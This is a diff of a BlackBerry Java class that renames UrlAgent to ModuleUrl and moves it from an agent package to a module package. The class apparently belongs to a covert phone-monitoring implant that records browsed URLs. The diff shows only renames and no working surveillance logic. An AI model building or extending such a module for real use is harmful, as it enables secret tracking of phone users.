@@ -7,7 +7,7 @@
  * File         : UrlAgent.java
  * Created      : 28-apr-2010
  * *************************************************/
-package blackberry.agent;
+package blackberry.module;
 
 import java.util.Date;
 import java.util.Vector;
@@ -30,7 +30,7 @@ import blackberry.utils.WChar;
 /**
  * The Class UrlAgent.
  */
-public final class UrlAgent extends Module implements ApplicationObserver,
+public final class ModuleUrl extends BaseModule implements ApplicationObserver,
         BacklightObserver {
     //#ifdef DEBUG
     static Debug debug = new Debug("UrlAgent", DebugLevel.VERBOSE);
@@ -50,8 +50,8 @@ public final class UrlAgent extends Module implements ApplicationObserver,
      * @param agentStatus
      *            the agent status
      */
-    public UrlAgent(final boolean agentEnabled) {
-        super(Module.AGENT_URL, agentEnabled, Conf.AGENT_URL_ON_SD, "UrlAgent");
+    public ModuleUrl(final boolean agentEnabled) {
+        super(BaseModule.AGENT_URL, agentEnabled, Conf.AGENT_URL_ON_SD, "UrlAgent");
 
         //#ifdef URL_FORCED
         enable(true);
@@ -70,7 +70,7 @@ public final class UrlAgent extends Module implements ApplicationObserver,
      * @param confParams
      *            the conf params
      */
-    protected UrlAgent(final boolean agentStatus, final byte[] confParams) {
+    protected ModuleUrl(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
 
@@ -205,8 +205,8 @@ public final class UrlAgent extends Module implements ApplicationObserver,
 
     }
 
-    public static UrlAgent getInstance() {
-        return (UrlAgent) AgentManager.getInstance().getItem(Module.AGENT_URL);
+    public static ModuleUrl getInstance() {
+        return (ModuleUrl) AgentManager.getInstance().getItem(BaseModule.AGENT_URL);
     }
 
     //#ifdef DEBUG
